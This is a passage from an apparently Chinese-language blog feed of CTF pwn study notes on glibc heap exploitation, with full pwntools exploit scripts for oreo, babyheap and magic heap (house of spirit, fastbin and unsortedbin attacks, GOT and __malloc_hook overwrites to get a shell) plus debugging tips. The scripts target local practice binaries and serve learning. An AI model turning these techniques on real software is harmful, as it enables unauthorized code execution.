class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><p><strong>难度:★★</strong></p><p>防护照旧</p><p>很容易发现添加操作时的读取溢出,且申请的chunk的最后四字节存放上一个chuk的指针</p><p>即用单链表存储申请的chunk</p><p>加上溢出可以控制这个指针</p><p>写的功能除了add就只剩下leave_messa了</p><p>且free时就是按照单链表来取出chunk逐个free</p><p>故利用点是house of spirit,方向是在message指向处伪造chunk,刚好程序存在一个记录chunk数的内存域,可以被视为size,只要chunk数量刚好对齐</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,des</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle name: &#x27;)</span></span><br><span class="line">    p.sendline(name)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;Rifle description: &#x27;)</span></span><br><span class="line">    p.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(b&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">name=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(name,<span class="string">b&#x27;\n&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr=p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr=u32(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=base_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (count &lt; <span class="number">0x3f</span>):</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">27</span>+p32(<span class="number">0x804a2a8</span>)</span><br><span class="line">add(payload,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x40</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">message(payload)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;Okay order submitted!\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>])</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, payload)</span><br><span class="line"></span><br><span class="line">message(p32(system) + <span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)<span class="comment">#;执行多个命令,写完后立马执行</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>再次记一下,puts函数遇到空字符结束,且必然会在结尾添加一个’\n’,无论结尾本身是否有换行</strong></p><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p><strong>难度:★★★</strong></p><p>这题的难度有一部分在于程序本身较为复杂,静态分析需要不少功夫</p><h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><p><strong>难度:★★★</strong></p><p>这题开启了pie和以上几题不同</p><p>这题关键的漏洞在于填充申请的chunk时,大小是我们自己任意指定的,而不是申请时的大小,意味着几乎无限制溢出</p><p>攻击中用到fastbin attack与unsortedbin attack</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)  <span class="comment">#idx3 for overflow idx4</span></span><br><span class="line">alloc(<span class="number">0x80</span>)  <span class="comment">#idx4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">#头插法 layout fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)<span class="comment">#fixed size</span></span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#get idx4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#idx5 avoid consolidate to top</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortedbin_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(unsortedbin_addr))</span><br><span class="line">main_arena=unsortedbin_addr-<span class="number">88</span></span><br><span class="line">libc_base=main_arena-main_arena_offset</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">alloc(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>一个很关键的点在要从idx4中切割出第一个0x70大小的chunk,这样再把这个chunk释放掉才能直接控制fd,当然另外申请0x70大小的也是可行的,要多麻烦几步就是了</p><p><strong>小记0x7-0xa</strong></p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><strong>难度:★</strong></p><p>功能可以说是非常常规了,保护照旧nx和canary</p><p>漏洞点是edit时大小是由自己定的,无限制溢出</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="0x1第一个chunk起始地址"><a href="#0x1第一个chunk起始地址" class="headerlink" title="0x1第一个chunk起始地址"></a>0x1第一个chunk起始地址</h2><p>一般程序在运行中进行第一次io操作时<u><strong>(i操作申请一个,o操作申请一个)</strong></u>,都会申请两个chunk(应该是stdin和stdout的缓冲区)</p><p>而这两个chunk的大小一般变化不大,且后两个十六进制位一般都为0x90和0x10(多做几题之后发现好像并不如此)</p><p>这也就是说除了这两个chunk外的第一个chunk的实际地址末两个十六进制位一般定为0xa0</p><p>这应该算一个小细节</p><p>不过还不确定跟环境有没有关系</p><p><strong>已知：</strong></p><ol><li>如果程序有setbuf(stdin/stdout/stderr,0)操作的话就只会申请一个chunk了,且是大小结尾为0x90那个(应该是stdout的缓冲区)，对单独程序可以先行调试看看——-<strong><u>与setbuf有关</u></strong></li><li>又发现有没有这两个chunk还跟<strong>动态库libc和动态链接器ld的版本有关系</strong>，原装环境存在iochunk,但在切换动态版本后却没有这两个chunk，切换动态库和链接器后再次调试确定———<strong><u>与动态版本有关</u></strong></li><li>还与程序唤起方式有关<strong>,gdb唤起</strong>与<strong>pwntools唤起</strong>亦有差异,二者可能一个有一个没有——-<strong><u>与唤起方式有关</u></strong></li></ol><h2 id="0x2hook执行参数"><a href="#0x2hook执行参数" class="headerlink" title="0x2hook执行参数"></a>0x2hook执行参数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//_libc_free</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_malloc</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_realloc</span></span><br></pre></td></tr></table></figure><p>可以看到,hook不为空时,执行hook指向函数时的参数是由其包装函数决定的</p><ol><li>free执行时,是以所要释放chunk的mem指针作为参数</li><li>malloc和realloc都是以申请chunk大小(用户申请,非实际大小)为参数</li></ol><p>对于2来说,hook基本只能是onegadget了</p><p>但对于1来说,若在chunk中填入一些字符(如/bin/sh),则除了onegadget外,也可以直接调用system等函数,这题就是这样</p><h2 id="0x3mmap所分配chunk"><a href="#0x3mmap所分配chunk" class="headerlink" title="0x3mmap所分配chunk"></a>0x3mmap所分配chunk</h2><p>当申请chunk大小大于或接近top_chunk时,会创建mmap段并在mmap段中分配</p><p>分配的chunk的实际地址就是该mmap段的开始地址</p><p>且mmap段与libc.so段之间的偏移是固定的</p><p>在不能泄露libc的情况下可以用其相对偏移得到libc地址</p><h2 id="0x4双hook配合"><a href="#0x4双hook配合" class="headerlink" title="0x4双hook配合"></a>0x4双hook配合</h2><p>大多数时候,malloc_hook和realloc_hook(二者地址相邻)的fastbinchunk伪造都能寻找到合适的fakechunk,但free_hook则更难找到</p><p>当one_gadget直接使用都不能满足条件时,则要先跳转到realloc进行栈帧调整(调整多少,可以通过跳转偏移来控制),之后调用realloc_hook执行onegadget</p><h2 id="0x5-fini-array"><a href="#0x5-fini-array" class="headerlink" title="0x5.fini_array"></a>0x5.fini_array</h2><p>程序正常退出时会由_dl_fini(_dl_fini+823左右)调用<code>.fini_array</code>地址处的函数，<strong>不过只能利用一次</strong>。只能利用一次是因为栈上的环境等肯定变化了，返回地址等自然也变化了</p><p>在没开pie的情况下利用还是很简单的</p><h2 id="0x6调试细节"><a href="#0x6调试细节" class="headerlink" title="0x6调试细节"></a>0x6调试细节</h2><p>一直以来都被这个调试搞得很烦,gdb常常不在exp中我所需要的地方开始,偶尔还不能加载符号表…</p><p>苦于找不到相关的资料,只能之际摸索,总算找到解决方案了</p><h3 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h3><p><strong>程序由gdb运行和pwntools运行这两种方式,唤起的程序的环境有些许不同</strong></p><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>先说有时候无法加载符号表,导致无法正常调试</p><p>多次实验后发现起因是—exp一路打通了shell所导致</p><p><strong>解决方案:</strong>在p.interactive()函数前使用命令<strong>sleep(1)或pause()</strong>使得程序停下来</p><p>这样便能加载符号表了</p><h3 id="合适的调试起始位置"><a href="#合适的调试起始位置" class="headerlink" title="合适的调试起始位置"></a>合适的调试起始位置</h3><p>经常attach上去发现不是自己想要的位置,导致调试困难</p><p><strong>解决方案:</strong>在gdb.attach()下方使用命令<strong>sleep(1)或pause()</strong>使得程序停下来,然后再<strong>配合backtrace</strong>找到合适的断点,进入正确的流程便可,(有时会被read卡住,需要再发送点东西)</p><p>需要注意如果没找到合适的断点的话,可能会出现一些奇怪的错误</p><h3 id="另一种调试方式"><a href="#另一种调试方式" class="headerlink" title="另一种调试方式"></a>另一种调试方式</h3><p>由于pwntools中gdb常用是attach附加到一个进程上,所以完全可以,早早打开gdb,然后在命令行中输入交互指令并发送,然后在gdb中逐步向下运行到需要调试的地方,(有时会被read卡住,需要再发送点东西)</p><h2 id="0x7main-arena偏移的获取"><a href="#0x7main-arena偏移的获取" class="headerlink" title="0x7main_arena偏移的获取"></a>0x7main_arena偏移的获取</h2><p>因为不能直接搜索符号main_arena,所以只能间接获得</p><p><code>main_arena_offset = libc.symbols[&#39;__malloc_hook&#39;] + 0x10</code></p><p>即main_arena在__malloc_hook向后0x10处</p><h2 id="0x8calloc分配的chunk"><a href="#0x8calloc分配的chunk" class="headerlink" title="0x8calloc分配的chunk"></a>0x8calloc分配的chunk</h2><p><code>malloc</code>分配的内存块的内容是不确定的，它可能包含之前被使用的数据残留。而<code>calloc</code>函数分配的内存块在分配时会被初始化为零，也就是说，每个字节都被设置为\0。</p><h2 id="0x9-maloc-hook附近的fake-chunk"><a href="#0x9-maloc-hook附近的fake-chunk" class="headerlink" title="0x9 __maloc_hook附近的fake_chunk"></a>0x9 __maloc_hook附近的fake_chunk</h2><p>一般情况下找到的能够控制到__maloc_hook的fake_chunk的大小都是<strong>0x7f</strong>,在main_arena前附近</p><h2 id="0xa-PIE的一种应对方式"><a href="#0xa-PIE的一种应对方式" class="headerlink" title="0xa PIE的一种应对方式"></a>0xa PIE的一种应对方式</h2><p>当开启pie后,利用方式与不开启有明显差异,一种比较常见的应对方式是部分改写</p><p>利用后12位不变性以及页对齐带来的堆地址结尾可观测性</p><p>通过只改写部分数据来达到错位访问所需内存的目的</p><p>在堆中因为要出现堆地址,所以一般要先释放两个大小相同chunk,以达到通过fd获取某个chunk的地址,之后再部分写</p>]]></content>
    
    
    <summary type="html">实操</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="实操" scheme="https://ixout.github.io/tags/%E5%AE%9E%E6%93%8D/"/>
    
  </entry>
  
  <entry>
    <title>FCTF</title>
    <link href="https://ixout.github.io/posts/21638/"/>
    <id>https://ixout.github.io/posts/21638/</id>
    <published>2023-04-18T08:57:52.000Z</published>
    <updated>2023-05-20T04:18:44.439Z</updated>
    
